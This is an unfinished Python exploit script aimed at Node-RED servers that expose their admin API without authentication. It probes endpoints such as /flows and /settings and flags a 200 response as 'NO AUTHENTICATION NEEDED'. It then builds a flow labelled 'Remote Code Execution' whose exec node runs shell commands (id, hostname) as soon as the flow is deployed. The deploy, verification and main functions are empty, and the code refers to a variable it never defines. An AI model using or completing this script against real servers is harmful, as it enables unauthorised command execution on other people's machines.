import argparse
import json
import subprocess
import sys

ERROR = '\033[91m [!!!]\033[0m'
WARNING = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
CRITICAL = '\033[43m>>>\033[0m'
COLOUR_END = '\033[0m'
UNDERLINE = '\033[4m'

try:
    import requests
except ImportError:
    sys.exit(f"{ERROR} Request unavailable. Try: pip install requests")

targetHost = input("Target Host: ")
targetPort = input("Target Port: ")
piUser = input("Target Device User: ")

options = ["/flows", "/settings", "/nodes", "/context", "/subflows", "/palette"]

while True:

    targetTopic = input("Target Topic (Enter '-h' for topic types): ")

    if targetTopic == "-h":
        print("Available options:")
        for option in options:
            print(f"  {option}")
        continue

    if targetTopic in options:
        print(f"Selected option: {targetTopic}")
        break

    print("Invalid option. Enter -h to see available options.")

targetURL = f"http://{targetHost}:{targetPort}{targetTopic}"

nodeConfirm_File = "/tmp/RCEnodeConfirm.txt"

print(f"Target URL: {targetURL}")

flowPayload = [
    {
        "id": "nodeTab",
        "type": "tab",
        "label": "Remote Code Execution",
        "disabled": False,
    },
    {
        "id": "nodeInjection",
        "type": "inject",
        "z": "nodeTab",
        "name": "fireOnce_Inject",
        "once": True,
        "onceDelay": 0.1, 
        "topic":"",
        "payload":"",
        "payloadType": "date",
        "wires": [["flowDeploy_exec"]]
    },
    {
        "id": "flowDeploy_exec",
        "type": "exec",
        "z": "nodeTab",
        "name": "confirmRCE",
        "command": (
            f"id; hostname; "
            f"echo {nodeConfirm_File}"
        ),
        "addpay": False,
        "append":"",
        "useSpawn": "false",
        "timer":"",
        "winHide": False,
        "oldrc": False,
        "wires": [[], [], []]
    }
]

def authCheck():
    print(f"{NOTIFICATION} GET {targetURL}")
    print(f"\n{NOTIFICATION} Accessing authorization settings")
    try:
        r = requests.get(settingsURL, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"{ERROR} {targetURL} could not be reached.")
        print(f"{WARNING} Try: Check host status")
        sys.exit

    print(f" HTTP {r.status_code}")
    if r.status_code == 200: #200 OK - Operational
         print(f"{NOTIFICATION} {targetURL} returned '200' without credentials")
         print(f"{CRITICAL} NO AUTHENTICATION NEEDED")
         print(f" Body: {r.text[:120]} \n")
         return True
    elif r.status_code == 401:
        print(f"{ERROR} ")

def deployFlow():


def RCEverify():


def main():